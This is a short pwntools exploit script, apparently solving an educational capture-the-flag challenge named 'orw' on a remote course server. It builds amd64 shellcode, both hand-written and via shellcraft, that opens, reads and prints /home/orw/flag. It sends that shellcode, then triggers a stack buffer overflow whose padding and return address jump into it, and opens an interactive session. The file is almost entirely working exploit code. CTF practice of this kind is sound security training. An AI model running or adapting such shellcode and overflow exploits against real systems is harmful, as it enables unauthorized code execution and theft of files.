from pwn import *

path = "/home/orw/flag"
path_hex = []
for x in path:
    path_hex.append(hex(ord(x)))
print(path_hex)
# ['0x2f', '0x68', '0x6f', '0x6d', '0x65', '0x2f', '0x6f', '0x72', '0x77', '0x2f', '0x66', '0x6c', '0x61', '0x67']

'''
fd = open("/home/orw/flag", 0, 0) -> fd = rax

mov rax, 0x67616c662f77
push rax
mov rax, 0x726f2f656d6f682f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

read(fd, buf, 0x30)
mov rdi, rax
mov rsi, rsp
mov rdx, 0x30
mov rax, 0
syscall

write(1, buf, 0x30)
mov rdi, 1
mov rsi, rsp
mov rdx, 0x30
mov rax, 1
syscall
'''
context.arch = 'amd64'
shellcode = asm('''
    mov rax, 0x67616c662f77
    push rax
    mov rax, 0x726f2f656d6f682f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x30
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x30
    mov rax, 1
    syscall    
''')

shellcode2 = asm(
    shellcraft.pushstr("/home/orw/flag") + 
    shellcraft.open("rsp", 0, 0) +
    shellcraft.read("rax", "rsp", 0x30) + 
    shellcraft.write(1, "rsp", 0x30)
)

conn = remote("edu-ctf.csie.org", 10171)
conn.sendlineafter("Give me your shellcode>", shellcode2)
bof = 'a'*0x18 + p64(0x6010a0)
conn.sendlineafter("I give you bof, you know what to do :)", bof)
conn.interactive()
